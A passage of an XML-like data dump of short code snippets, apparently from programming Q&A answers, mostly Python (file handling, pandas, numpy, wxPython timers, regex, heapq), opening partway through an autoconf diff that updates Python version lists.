 found_one=''
 _ONE_CC_PYTHON([=2.3], [2_3])
@@ -119,7 +119,7 @@ unset PYTHON
 _ONE_CC_PYTHON([=2.4], [2_4])
 if test -f "$PYTHON" ; then found_one=$PYTHON ; PYTHONS="$PYTHON $PYTHONS" ; fi
 unset PYTHON
-_ONE_CC_PYTHON([=2.5], [2_5])
+_ONE_CC_PYTHON([=2.7], [2_7])
 if test -f "$PYTHON" ; then found_one=$PYTHON ; PYTHONS="$PYTHON $PYTHONS" ; fi
 unset PYTHON
 _ONE_CC_PYTHON([=2.6], [2_6])
diff --git a/config/python.m4 b/config/python.m4
index c8c5e30..4d0366e 100644
--- a/config/python.m4
+++ b/config/python.m4
@@ -42,7 +42,7 @@ AC_DEFUN([AM_PATH_PYTHON],
   dnl $prefix/lib/site-python in 1.4 to $prefix/lib/python1.5/site-packages
   dnl in 1.5.
   m4_define_default([_AM_PYTHON_INTERPRETER_LIST],
-                      [python python2 python2.5 python2.6 python2.4 python2.3 python2.2 dnl
+                      [python python2 python2.7 python2.6 python2.4 python2.3 python2.2 dnl
 python2.1 python2.0 python1.6 python1.5])

   m4_if([$1],[],[
</snippet></ROW><ROW><id>20340002</id><snippet>with open('nameOfYourSaveFile', 'w') as saveFile:
    #.write() does not automatically add a newline, like print does
    saveFile.write(myString + "\n")
</snippet></ROW><ROW><id>20340002</id><snippet>w</snippet></ROW><ROW><id>20340002</id><snippet>w+</snippet></ROW><ROW><id>20340002</id><snippet>a</snippet></ROW><ROW><id>20340002</id><snippet>with open('nameOfYourSaveFile', 'w') as saveFile:
    for i in xrange(10):
         saveFile.write(name[i] + str(phoneNumber[i]) + email[i] + "\n")
</snippet></ROW><ROW><id>20340002</id><snippet>names = []
numbers = []
emails = []

with open('nameOfYourSaveFile', 'r') as inFile:
    for line in inFile:
        #get rid of EOL
        line = line.rstrip()

        #random example
        names.append(line[0])
        numbers.append(line[1])
        emails.append(line[2])

        #Or another approach if we want to simply print each token on a newline
        for word in line:
            print word 
</snippet></ROW><ROW><id>20340197</id><snippet>pyjs</snippet></ROW><ROW><id>20340197</id><snippet>input</snippet></ROW><ROW><id>20340197</id><snippet>print</snippet></ROW><ROW><id>20340197</id><snippet>mod_python</snippet></ROW><ROW><id>20340264</id><snippet>for line in f:
    line=line.strip()
    tokens=line.split()
    a=int(tokens[0])
    b=int(tokens[1])
</snippet></ROW><ROW><id>20340264</id><snippet>print</snippet></ROW><ROW><id>20340264</id><snippet>a_list, b_list = [], []
for line in f:
    line=line.strip()
    tokens=line.split()
    a=int(tokens[0])
    b=int(tokens[1])
    a_list.append(a)
    b_list.append(b)
print sum(a_list)
print sum(b_list)
</snippet></ROW><ROW><id>20340264</id><snippet>a_total = b_total = 0
for line in f:
    line=line.strip()
    tokens=line.split()
    a=int(tokens[0])
    b=int(tokens[1])
    a_total += a
    b_total += b
print a_total
print b_total
</snippet></ROW><ROW><id>20340313</id><snippet>time.sleep(1)</snippet></ROW><ROW><id>20340313</id><snippet>while</snippet></ROW><ROW><id>20340313</id><snippet>wx</snippet></ROW><ROW><id>20340313</id><snippet>SafeYield</snippet></ROW><ROW><id>20340313</id><snippet>sleep</snippet></ROW><ROW><id>20340313</id><snippet>def OnTossUpTimer(self, event):
    self.tossuptimer -= 1
    if self.tossuptimer &gt; 0:
        self.tossupbutton.SetLabel(str(self.tossuptimer) + "Seconds")
    else:
        self.tossupbutton.SetLabel("Time is Up!")
        self.tossuptimer_timer.Stop()

def TossUpTimer(self, event):
    self.tossuptimer = 5
    self.tossupbutton.SetLabel(str(self.tossuptimer) + "Seconds")
    self.tossuptimer_timer = wx.Timer(self)
    self.Bind(wx.EVT_TIMER, self.OnTossUpTimer, self.tossuptimer_timer)
    self.tossuptimer_timer.Start(1000, False)
</snippet></ROW><ROW><id>20340313</id><snippet>Timer</snippet></ROW><ROW><id>20340313</id><snippet>PostEvent</snippet></ROW><ROW><id>20340313</id><snippet>class LabelUpdateEvent(wx.PyEvent):
    EVT_LABEL_UPDATE_ID = wx.NewId()
    def __init__(self, data):
        wx.PyEvent.__init__(self)
        self.SetEventType(EVT_LABEL_UPDATE_ID)
        self.data = data

def SetLabelOnMainThread(self, value):
    wx.PostEvent(self.SetLabelForReal, ResultEvent(value))

def SetLabelForReal(self, event):
    self.tossupbutton.SetLabel(event.data)

def TossUpTimerThread(self):
    self.tossuptimer = 5
    while self.tossuptimer &gt; 0:
        self.SetLabelOnMainThread(str(self.tossuptimer) + "Seconds")
            time.sleep(1)
            self.tossuptimer -= 1
    self.SetLabelOnMainThread(str(self.tossuptimer) + "Time is Up!")

def TossUpTimer(self, event):
    threading.Thread(target=self.TossUpTimerThread).start()
</snippet></ROW><ROW><id>20340313</id><snippet>wxPython</snippet></ROW><ROW><id>20340511</id><snippet>a = ["2001", "Q2", "WK01"]
b = ["2002", "Q2", "WK01"]
c = ["2002", "Q2", "WK02"]
</snippet></ROW><ROW><id>20340511</id><snippet>def tolist(x):
    g = re.match(r"(WK\d{2})(Q\d)(\d{4})", str(x))
    return [g.group(3), g.group(2), g.group(1)]
</snippet></ROW><ROW><id>20340511</id><snippet> df['datelist'] = df['Date'].apply(tolist)
</snippet></ROW><ROW><id>20340511</id><snippet>         Date  Price  Volume          datelist
0  WK01Q12001     32     500  [2001, Q1, WK01]
1  WK01Q12002     22     400  [2002, Q1, WK01]
2  WK01Q12003     42     500  [2003, Q1, WK01]
</snippet></ROW><ROW><id>20340511</id><snippet>df.sort('datelist')
</snippet></ROW><ROW><id>20340627</id><snippet>results = []
while (count &lt; int(pagecount)):
    count = count + 1
    request = requestGet("http://www.site.com/User.aspx?ID={0}&amp;page={1}".format(self.userid, count))
    regexdata = re.findall('REGEX" REGEX="(.*?)"', request)
    results.append(regexdata)
return results
</snippet></ROW><ROW><id>20340627</id><snippet>yield</snippet></ROW><ROW><id>20340627</id><snippet>while (count &lt; int(pagecount)):
    count = count + 1
    request = requestGet("http://www.site.com/User.aspx?ID={0}&amp;page={1}".format(self.userid, count))
    regexdata = re.findall('REGEX" REGEX="(.*?)"', request)
    yield regexdata
</snippet></ROW><ROW><id>20340627</id><snippet>return</snippet></ROW><ROW><id>20340627</id><snippet>return</snippet></ROW><ROW><id>20340660</id><snippet>#declare x at global scope
x = 0
#declare the function affecting x anywhere you want
def randstr():
    global x
    #..... code affecting the value of x
    return whatever
#then use your function affecting x
randstr()
</snippet></ROW><ROW><id>20340660</id><snippet>#pass x as argument 
def randstr(x):
    #..... code affecting the value of x
    return x
x = 0
#other code affecting x
#.....
#pass x as argument and modify the value of your local x
x = randstr(x)
</snippet></ROW><ROW><id>20340660</id><snippet>for characterVar in stringVar:
        #code that is repeated for each character
        #handling the character by manipulatin characterVar
        if characterVar == "a" :
            #do stuff if a character in stringVar is a "a"
</snippet></ROW><ROW><id>20340660</id><snippet>import random
import math

def randStr():
    x = 0.0
    small = ('abcdefghijklmnopqrstuvwxyz')
    capitals = ('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    digits = ('0123456789')
    d = ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    rs = (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d)) + (random.choice(d))
    qtyOfLetters = 0
    for char in rs:
        if char in small or char in capitals:
            qtyOfLetters += 1
    x += qtyOfLetters
    if rs[0] in capitals:
        x += 1.0
    for c in rs:
        if c in capitals:
            x -= 2.0
        if not ((c in capitals) or (c in small)):
            x -= (2.0 + 0.25 * qtyOfLetters)
    return (rs,x)

result = randStr()
print ("Generated string : '" + str(result[0]) +"'")
print ("result : " + str(result[1]))
</snippet></ROW><ROW><id>20340731</id><snippet>while</snippet></ROW><ROW><id>20340731</id><snippet>line</snippet></ROW><ROW><id>20340731</id><snippet>while line != '': # the last line wasn't empty
    line = file.readline() # but now this one is
    line = line.strip()
    val = line.split(',') # so this returns a single value
    for i in keylist:
        index = keylist.index(i) # so this raises an IndexError
        d[keylist[index]].append(val[index])
</snippet></ROW><ROW><id>20340731</id><snippet>readline</snippet></ROW><ROW><id>20340731</id><snippet>while True:
    line = file.readline()
    line = line.strip()
    if not line:
        break
    val = line.split(',') # so this returns a single value
    for i in keylist:
        index = keylist.index(i) # so this raises an IndexError
        d[keylist[index]].append(val[index])
</snippet></ROW><ROW><id>20340731</id><snippet>line</snippet></ROW><ROW><id>20340731</id><snippet>line = line.strip()</snippet></ROW><ROW><id>20340731</id><snippet>'\n'</snippet></ROW><ROW><id>20340731</id><snippet>''</snippet></ROW><ROW><id>20340731</id><snippet>for line in file:</snippet></ROW><ROW><id>20340731</id><snippet>readline</snippet></ROW><ROW><id>20340731</id><snippet>break</snippet></ROW><ROW><id>20340731</id><snippet>csv</snippet></ROW><ROW><id>20340731</id><snippet>d = defaultdict(list)
reader = csv.DictReader(file)
for line in reader:
    for key, value in line.items():
        d[key].append(value)
return d
</snippet></ROW><ROW><id>20340731</id><snippet>list_o_dicts = list(reader)</snippet></ROW><ROW><id>20340840</id><snippet>sum</snippet></ROW><ROW><id>20340840</id><snippet># Note the extra parenthesis
average = sum((first_score, second_score, third_score, fourth_score, fifth_score))
</snippet></ROW><ROW><id>20340840</id><snippet>or</snippet></ROW><ROW><id>20340840</id><snippet>if 90 &lt;= average &lt;= 100:
</snippet></ROW><ROW><id>20340840</id><snippet>else</snippet></ROW><ROW><id>20340840</id><snippet>scores = (first_score, second_score, third_score, fourth_score, fifth_score)
average = sum(scores)/len(scores)
if 89 &lt; average &lt; 101:
    print('A')
elif 79 &lt; average &lt; 90:
    print('B')
elif 69 &lt; average &lt; 80:
    print('C')
elif 59 &lt; average &lt; 70:
    print('D')
else:
    print('F')
</snippet></ROW><ROW><id>20340840</id><snippet>&lt;</snippet></ROW><ROW><id>20340840</id><snippet>&gt;=</snippet></ROW><ROW><id>20340880</id><snippet>my_code</snippet></ROW><ROW><id>20340880</id><snippet>'http://www.myapp.com/finish_box?code=my_code&amp;'</snippet></ROW><ROW><id>20340880</id><snippet>&gt;&gt;&gt; return_string = 'http://www.myapp.com/finish_box?code=my_code&amp;'

&gt;&gt;&gt; step1 = return_string.split('?')
["http://www.myapp.com/finish_box","code=my_code&amp;"]
</snippet></ROW><ROW><id>20340880</id><snippet>"http://www.myapp.com/finish_box"</snippet></ROW><ROW><id>20340880</id><snippet>"code=my_code&amp;"</snippet></ROW><ROW><id>20340880</id><snippet>&gt;&gt;&gt; step2 = step1[1].split("=")
["code","my_code&amp;"]
</snippet></ROW><ROW><id>20340880</id><snippet>&gt;&gt;&gt; return_string = r'http://www.myapp.com/finish_box?code=my_code&amp;junk_data=ohyestheresverymuch&amp;my_birthday=nottoday&amp;stackoverflow=usefulplaceforinfo'
</snippet></ROW><ROW><id>20340880</id><snippet>&amp;</snippet></ROW><ROW><id>20340880</id><snippet>step2 = step1[1].split("&amp;")
["code=my_code",
"junk_data=ohyestheresverymuch",
"my_birthday=nottoday",
"stackoverflow=usefulplaceforinfo"]
</snippet></ROW><ROW><id>20340880</id><snippet>&gt;&gt;&gt; list_those_args = []
&gt;&gt;&gt; for each_item in step2:
&gt;&gt;&gt;   list_those_args[each_item.split("=")[0]] = each_item.split("=")[1]
</snippet></ROW><ROW><id>20340880</id><snippet>list_those_args</snippet></ROW><ROW><id>20340880</id><snippet>&gt;&gt;&gt; list_those_args['code']
my_code
</snippet></ROW><ROW><id>20340936</id><snippet>queue.append(edges)</snippet></ROW><ROW><id>20340936</id><snippet>edges</snippet></ROW><ROW><id>20340936</id><snippet>str</snippet></ROW><ROW><id>20340936</id><snippet>queue</snippet></ROW><ROW><id>20340936</id><snippet>str</snippet></ROW><ROW><id>20340936</id><snippet>queue</snippet></ROW><ROW><id>20340936</id><snippet>for d in graph:
    if edges in d.keys():
        queue.append(d)
</snippet></ROW><ROW><id>20340970</id><snippet>__all__</snippet></ROW><ROW><id>20340970</id><snippet>__slots__</snippet></ROW><ROW><id>20340970</id><snippet>__weakref__</snippet></ROW><ROW><id>20340970</id><snippet>__module__</snippet></ROW><ROW><id>20340970</id><snippet>&gt;&gt;&gt; dir(type)
['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__dir__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__prepare__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
&gt;&gt;&gt; import sys
&gt;&gt;&gt; dir(type(sys))
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
</snippet></ROW><ROW><id>20340970</id><snippet>__mro__</snippet></ROW><ROW><id>20340970</id><snippet>__subclasses__</snippet></ROW><ROW><id>20340970</id><snippet>__format__</snippet></ROW><ROW><id>20340970</id><snippet>str.format</snippet></ROW><ROW><id>20340970</id><snippet>__weakrefoffset__</snippet></ROW><ROW><id>20340970</id><snippet>__prepare__</snippet></ROW><ROW><id>20340970</id><snippet>im_self</snippet></ROW><ROW><id>20340970</id><snippet>__qualname__</snippet></ROW><ROW><id>20340970</id><snippet>__name__</snippet></ROW><ROW><id>20340970</id><snippet>__file__</snippet></ROW><ROW><id>20340970</id><snippet>__path__</snippet></ROW><ROW><id>20340970</id><snippet>__loader__</snippet></ROW><ROW><id>20340970</id><snippet>__package__</snippet></ROW><ROW><id>20341058</id><snippet>In [11]: pd.DataFrame(list(my_dict.iteritems()),
                      columns=['business_id','business_code'])
Out[11]: 
  business_id business_code
0         id2          val2
1         id3          val3
2         id1          val1
</snippet></ROW><ROW><id>20341079</id><snippet>[[s, c] for s, c in this_amino if s == min_score]
</snippet></ROW><ROW><id>20341184</id><snippet>set_visible()</snippet></ROW><ROW><id>20341184</id><snippet>for label in cbar.ax.xaxis.get_ticklabels()[::2]:
    label.set_visible(False)
</snippet></ROW><ROW><id>20341303</id><snippet>this.py</snippet></ROW><ROW><id>20341493</id><snippet>editline</snippet></ROW><ROW><id>20341493</id><snippet>libedit</snippet></ROW><ROW><id>20341692</id><snippet>Server</snippet></ROW><ROW><id>20341692</id><snippet>Server</snippet></ROW><ROW><id>20341692</id><snippet>self.cores</snippet></ROW><ROW><id>20341692</id><snippet>__init__</snippet></ROW><ROW><id>20341692</id><snippet>class Server(object):
    def __init__(self):
        self.cores = []
</snippet></ROW><ROW><id>20341726</id><snippet>import numpy as np
import matplotlib.pyplot as plt
from lmfit import minimize, Parameters, report_fit

def gauss(x, amp, cen, sigma):
    "basic gaussian"
    return amp*np.exp(-(x-cen)**2/(2.*sigma**2))

def gauss_dataset(params, i, x):
    """calc gaussian from params for data set i
    using simple, hardwired naming convention"""
    amp = params['amp_%i' % (i+1)].value
    cen = params['cen_%i' % (i+1)].value
    sig = params['sig_%i' % (i+1)].value
    return gauss(x, amp, cen, sig)

def objective(params, x, data):
    """ calculate total residual for fits to several data sets held
    in a 2-D array, and modeled by Gaussian functions"""
    ndata, nx = data.shape
    resid = 0.0*data[:]
    # make residual per data set
    for i in range(ndata):
        resid[i, :] = data[i, :] - gauss_dataset(params, i, x)
    # now flatten this to a 1D array, as minimize() needs
    return resid.flatten()

# create 5 datasets
x  = np.linspace( -1, 2, 151)
data = []
for i in np.arange(5):
    params = Parameters()
    amp   =  0.60 + 9.50*np.random.rand()
    cen   = -0.20 + 1.20*np.random.rand()
    sig   =  0.25 + 0.03*np.random.rand()
    dat   = gauss(x, amp, cen, sig) + np.random.normal(size=len(x), scale=0.1)
    data.append(dat)

# data has shape (5, 151)
data = np.array(data)
assert(data.shape) == (5, 151)

# create 5 sets of parameters, one per data set
fit_params = Parameters()
for iy, y in enumerate(data):
    fit_params.add( 'amp_%i' % (iy+1), value=0.5, min=0.0,  max=200)
    fit_params.add( 'cen_%i' % (iy+1), value=0.4, min=-2.0,  max=2.0)
    fit_params.add( 'sig_%i' % (iy+1), value=0.3, min=0.01, max=3.0)

# but now constrain all values of sigma to have the same value
# by assigning sig_2, sig_3, .. sig_5 to be equal to sig_1
for iy in (2, 3, 4, 5):
    fit_params['sig_%i' % iy].expr='sig_1'

# run the global fit to all the data sets
minimize(objective, fit_params, args=(x, data))
report_fit(fit_params)

# plot the data sets and fits
plt.figure()
for i in range(5):
    y_fit = gauss_dataset(fit_params, i, x)
    plt.plot(x, data[i, :], 'o', x, y_fit, '-')

plt.show()
</snippet></ROW><ROW><id>20341929</id><snippet># this
tracks = Songplays.objects.using('prod').values().filter(user=id, when__gt=start, when__lt=end).order_by('-when')

#instead of this
tracks = Songplays.objects.using('prod').all().filter(user=id, when__gt=start, when__lt=end).order_by('-when')
</snippet></ROW><ROW><id>20341929</id><snippet>import json
data = json.dumps(list(tracks))
</snippet></ROW><ROW><id>20341959</id><snippet>&gt;&gt;&gt; a = np.array([[1,2,3,4], [5,6,7,8]])
&gt;&gt;&gt; a.shape
(2, 4)
&gt;&gt;&gt; a.shape = 4,2
&gt;&gt;&gt; a
array([[1, 2],
       [3, 4],
       [5, 6],
       [7, 8]])
</snippet></ROW><ROW><id>20341959</id><snippet>&gt;&gt;&gt; b
array([1, 2, 3, 4, 5, 6])
&gt;&gt;&gt; c = b.reshape(2,3,order='F')
&gt;&gt;&gt; c
array([[1, 3, 5],
       [2, 4, 6]])
</snippet></ROW><ROW><id>20342261</id><snippet>file_put_contents('manual_mode','1');
</snippet></ROW><ROW><id>20342261</id><snippet>file_put_contents('manual_mode','0');
</snippet></ROW><ROW><id>20342261</id><snippet>while 1:
    f = open('manual_mode','r')
    val = f.read()
    f.close()
    if val == '1':
        break
</snippet></ROW><ROW><id>20342261</id><snippet>&lt;?php
if(!empty($_GET['sw']) &amp;&amp; $_GET['sw'] == 1)
{
  file_put_contents('manual_mode','1');
} else
{
  file_put_contents('manual_mode','0');
}
</snippet></ROW><ROW><id>20342261</id><snippet>$.get("switch.php?sw=1");
</snippet></ROW><ROW><id>20342505</id><snippet>arrayHeap</snippet></ROW><ROW><id>20342505</id><snippet>heapq</snippet></ROW><ROW><id>20342505</id><snippet>def heapSort(lst):
    heap = arrayHeap.mkHeap(len(lst), arrayHeap.less)
    for v in lst:
        arrayHeap.add(heap, v)
    alst = []
    while heap.size:
        w = arrayHeap.removeMin(heap)
        alst.append(w)
    return last
</snippet></ROW><ROW><id>20342505</id><snippet>heapq</snippet></ROW><ROW><id>20342505</id><snippet>def heapSort(lst):
    alst = []
    for v in lst:
        heapq.heappush(alst, v)
    return [heapq.heappop(alst) for i in range(len(alst))]
</snippet></ROW><ROW><id>20342505</id><snippet>lst</snippet></ROW><ROW><id>20342505</id><snippet>def heapSort(lst):
    heapq.heapify(lst)
    return [heapq.heappop(lst) for i in range(len(lst))]
</snippet></ROW><ROW><id>20342505</id><snippet>lst</snippet></ROW><ROW><id>20342505</id><snippet>def heapSort(lst):
    alst = lst[:]
    heapq.heapify(alst)
    return [heapq.heappop(alst) for i in range(len(alst))]
</snippet></ROW><ROW><id>20342505</id><snippet>heapq</snippet></ROW><ROW><id>20342833</id><snippet>for intersect(input_set, set_1):
</snippet></ROW><ROW><id>20342833</id><snippet>for thing_in_both_sets in intersect(input_set, set_1):
    user_score += 1
</snippet></ROW><ROW><id>20342833</id><snippet>_</snippet></ROW><ROW><id>20342833</id><snippet>for _ in intersect(input_set, set_1):
    user_score += 1
</snippet></ROW><ROW><id>20342833</id><snippet>set</snippet></ROW><ROW><id>20342833</id><snippet>intersect</snippet></ROW><ROW><id>20342833</id><snippet>intersection</snippet></ROW><ROW><id>20342833</id><snippet>for _ in input_set.intersection(set_1):
</snippet></ROW><ROW><id>20342833</id><snippet>&amp;</snippet></ROW><ROW><id>20342833</id><snippet>len</snippet></ROW><ROW><id>20342833</id><snippet>user_score += len(input_set &amp; set_1)
user_score += len(input_set &amp; set_2) * 2
# etc.
</snippet></ROW><ROW><id>20342833</id><snippet>user_score = 0
for multiplier, user_set in enumerate(user_sets, 1):
    user_score += len(input_set &amp; user_set) * multiplier
</snippet></ROW><ROW><id>20342833</id><snippet>user_set</snippet></ROW><ROW><id>20342833</id><snippet>user_sets = (set_1, set_2, set_3, set_4)
</snippet></ROW><ROW><id>20342987</id><snippet>print 'empty' if not any(seq) else 'not empty'
</snippet></ROW><ROW><id>20343223</id><snippet>def delete_by_index(node, index):
    for _ in range(index):
        prev_node, node = node, node.next
    prev_node.next = node.next
</snippet></ROW><ROW><id>20343223</id><snippet>def delete_by_index(node, index):
    if not index:
        return node.next
    head = node
    for _ in range(index):
        prev_node, node = node, node.next
    prev_node.next = node.next
    return head
</snippet></ROW><ROW><id>20343223</id><snippet>nth</snippet></ROW><ROW><id>20343223</id><snippet>def delete_by_index(node, index):
    if not index:
        return node.next
    prev_node = nth(node, index-1)
    prev_node.next = prev_node.next.next
    return node
</snippet></ROW><ROW><id>20343223</id><snippet>delete_by_index</snippet></ROW><ROW><id>20343223</id><snippet>nth</snippet></ROW><ROW><id>20343223</id><snippet>try</snippet></ROW><ROW><id>20343223</id><snippet>except</snippet></ROW><ROW><id>20343223</id><snippet>IndexError</snippet></ROW><ROW><id>20343223</id><snippet>delete_by_data(node, data)</snippet></ROW><ROW><id>20343223</id><snippet>delete_by_identity(node, child_node)</snippet></ROW><ROW><id>20343231</id><snippet>&gt;&gt;&gt; from intelhex import IntelHex
&gt;&gt;&gt; ih = IntelHex()                     # create empty object
&gt;&gt;&gt; ih.loadhex('foo.hex')               # load from hex
&gt;&gt;&gt; ih.loadfile('bar.hex',format='hex') # also load from hex
&gt;&gt;&gt; ih.fromfile('bar.hex',format='hex') # also load from hex
</snippet></ROW><ROW><id>20343231</id><snippet>&gt;&gt;&gt; from intelhex import IntelHex
&gt;&gt;&gt; ih = IntelHex()                     # create empty object
&gt;&gt;&gt; ih.loadbin('foo.bin')               # load from bin
&gt;&gt;&gt; ih.fromfile('bar.bin',format='bin') # also load from bin
&gt;&gt;&gt; ih.loadbin('baz.bin',offset=0x1000) # load binary data and place them
&gt;&gt;&gt;                                     # starting with specified offset
</snippet></ROW><ROW><id>20343231</id><snippet>&gt;&gt;&gt; from intelhex import IntelHex
&gt;&gt;&gt; ih = IntelHex('foo.hex') # create empty object
&gt;&gt;&gt; pydict = ih.todict()     # dump contents to pydict
...do something with the dictionary...

&gt;&gt;&gt; newIH = IntelHex(pydict) # recreate object with dict
&gt;&gt;&gt; another = IntelHex()     # make a blank instance
&gt;&gt;&gt; another.fromdict(pydict) # now another is the same as newIH
</snippet></ROW><ROW><id>20343347</id><snippet>lambda</snippet></ROW><ROW><id>20343347</id><snippet>iter</snippet></ROW><ROW><id>20343347</id><snippet>PipeLine</snippet></ROW><ROW><id>20343347</id><snippet>iter(src)</snippet></ROW><ROW><id>20343414</id><snippet>work([hours][6])
</snippet></ROW><ROW><id>20343414</id><snippet>work[hours][5]
</snippet></ROW><ROW><id>20343414</id><snippet>work</snippet></ROW><ROW><id>20343414</id><snippet>[hours]</snippet></ROW><ROW><id>20343414</id><snippet>for item in work:
    student_hours = item[5]
    print(student_hours)
</snippet></ROW><ROW><id>20343414</id><snippet>Student_IDs.values()</snippet></ROW><ROW><id>20343414</id><snippet>for item in Student_IDs.values():
    student_hours = item[5]
    print(student_hours)
</snippet></ROW><ROW><id>20343433</id><snippet>re.sub</snippet></ROW><ROW><id>20343433</id><snippet>re.sub(r'([][?!()";{}])', r' \1 ', mytext)
</snippet></ROW><ROW><id>20343433</id><snippet>re.sub(r'(?&lt;=\S)(?=[][?!()";{}])|(?&lt;=[][?!()";{}])(?=\S)', ' ', mytext)
</snippet></ROW><ROW><id>20343556</id><snippet>a[1]</snippet></ROW><ROW><id>20343556</id><snippet>tokens[1]</snippet></ROW><ROW><id>20343556</id><snippet>a</snippet></ROW><ROW><id>20343556</id><snippet>tokens</snippet></ROW><ROW><id>20343556</id><snippet>Nick
</snippet></ROW><ROW><id>20343556</id><snippet>tokens</snippet></ROW><ROW><id>20343556</id><snippet>"34"
</snippet></ROW><ROW><id>20343556</id><snippet>a = int(tokens[1])
</snippet></ROW><ROW><id>20343556</id><snippet>with open('example.txt') as f:
    ages = {}
    for line in f:
        d = line.split()
        ages[d[0]] = int(d[1])
</snippet></ROW><ROW><id>20343556</id><snippet>ages</snippet></ROW><ROW><id>20343556</id><snippet>{'John':26, 'Mary':48, 'Nick':34} 
</snippet></ROW><ROW><id>20343556</id><snippet>John</snippet></ROW><ROW><id>20343556</id><snippet>print(ages['John'])
</snippet></ROW><ROW><id>20344576</id><snippet>data_dict</snippet></ROW><ROW><id>20344576</id><snippet>data_dict</snippet></ROW><ROW><id>20344576</id><snippet>data_dict.clear()
data_dict.update(json.loads(load_file))
</snippet></ROW><ROW><id>20344704</id><snippet>shift()</snippet></ROW><ROW><id>20344704</id><snippet>df['z-1'] = df.groupby('a')['z'].transform(lambda x:x.shift(-1))
</snippet></ROW><ROW><id>20344704</id><snippet>apply()</snippet></ROW><ROW><id>20344704</id><snippet>def lkp_data(c,d,v):
    d = df[(df['c'] == c) &amp; (df['d'] == d) &amp; (df['v'] == v)]['z']
    return None if len(d) == 0 else d.values[0]

df['z[c-1]'] = df.apply(lambda x: lkp_data(x['c'] - 1, x['d'], x['v']), axis=1)
df['z[c+1]'] = df.apply(lambda x: lkp_data(x['c'] + 1, x['d'], x['v']), axis=1)
df['z[d-1]'] = df.apply(lambda x: lkp_data(x['c'], x['d'] - 1, x['v']), axis=1)
df['z[d+1]'] = df.apply(lambda x: lkp_data(x['c'], x['d'] + 1, x['v']), axis=1)

    c   d      z  v  z[c-1]  z[c+1]  z[d-1]  z[d+1]
0  15  42   5460  1     NaN    7540     NaN    9620
1  15  42   6500  2     NaN    8580     NaN   10660
2  16  42   7540  1    5460     NaN     NaN    3452
3  16  42   8580  2    6500     NaN     NaN    4561
4  15  43   9620  1     NaN    3452    5460     NaN
5  15  43  10660  2     NaN    4561    6500     NaN
6  16  43   3452  1    9620     NaN    7540     NaN
7  16  43   4561  2   10660     NaN    8580     NaN
</snippet></ROW><ROW><id>20344897</id><snippet>y = k * x + b</snippet></ROW><ROW><id>20344897</id><snippet>x</snippet></ROW><ROW><id>20344897</id><snippet>y</snippet></ROW><ROW><id>20344897</id><snippet>y</snippet></ROW><ROW><id>20344897</id><snippet>k</snippet></ROW><ROW><id>20344897</id><snippet>b</snippet></ROW><ROW><id>20344897</id><snippet>x</snippet></ROW><ROW><id>20344897</id><snippet>numpy.linalg.lstsq</snippet></ROW><ROW><id>20344897</id><snippet>import numpy as np

x = np.random.rand(50)
k = np.random.rand(1000)
b = np.random.rand(1000)

y = np.outer(x, k) + b + np.random.normal(size=(50, 1000), scale=1e-10)

r = np.linalg.lstsq(np.c_[x, np.ones_like(x)], y)[0]

print np.allclose(r[0], k)
print np.allclose(r[1], b)
</snippet></ROW><ROW><id>20344897</id><snippet>a</snippet></ROW><ROW><id>20344897</id><snippet>b</snippet></ROW><ROW><id>20344897</id><snippet>numpy.linalg.solve(a, b)</snippet></ROW><ROW><id>20344897</id><snippet>import numpy as np

N = 50
M = 1000

x = np.random.rand(N)
X = np.c_[x, np.ones_like(x)]
beta = np.random.rand(M, 2)
Y = np.dot(beta, X.T)
Y += np.random.normal(scale=0.1, size=Y.shape)
mask = np.random.randint(0, 2, size=Y.shape).astype(np.bool)

a = np.swapaxes(np.dot(X.T, (X[None, :, :] * mask[:, :, None])), 0, 1)
b = np.dot(X.T, (mask*Y).T)
beta2 = np.linalg.solve(a, b.T)

i = 123
print "real:", beta[i]
print "by solve:", beta2[i]

m = mask[i]
x2 = X[m]
y2 = Y[i, m]
print "by lstsq:", np.linalg.lstsq(x2, y2)[0]
</snippet></ROW><ROW><id>20344897</id><snippet>real: [ 0.35813131  0.29736779]
by solve: [ 0.38088499  0.30382547]
by lstsq: [ 0.38088499  0.30382547]
</snippet></ROW><ROW><id>20344897</id><snippet>a</snippet></ROW><ROW><id>20344897</id><snippet>a2 = np.empty((M, 2, 2))
xm = mask * x
a2[:, 0, 0] = (xm*xm).sum(1)
a2[:, 1, 0] = (xm*mask).sum(1)
a2[:, 0, 1] = a2[:, 1, 0]
a2[:, 1, 1] = (mask).sum(1)

print np.allclose(a2, a)
</snippet></ROW><ROW><id>20345110</id><snippet>def check_list(lst):
    for num in lst:
        if num % 2 == 0:
            return False
    return True
</snippet></ROW><ROW><id>20345110</id><snippet>check_list()</snippet></ROW><ROW><id>20345110</id><snippet>False</snippet></ROW><ROW><id>20345110</id><snippet>containsOnlyOdds</snippet></ROW><ROW><id>20345272</id><snippet>numpy.bmat([[numpy.zeros(appropriate_shape), A], [B, C]])
</snippet></ROW><ROW><id>20345272</id><snippet>asarray</snippet></ROW><ROW><id>20345273</id><snippet>pattern = re.compile(b"[\x40-\x4F]")
</snippet></ROW><ROW><id>20345273</id><snippet>&gt;&gt;&gt; for byte in ('\x3f', '\x40', '\x42', '\x4f', '\x50'): print bool(pattern.search(byte))
... 
False
True
True
True
False
</snippet></ROW><ROW><id>20345273</id><snippet>my_pattern = re.compile(b"\xDE\xAD[\x40-\x4F].")
</snippet></ROW><ROW><id>20345555</id><snippet>bS = 'tgby'
prd = ["".join(it) for it in itertools.product(bS, repeat=len(bS)-1)]
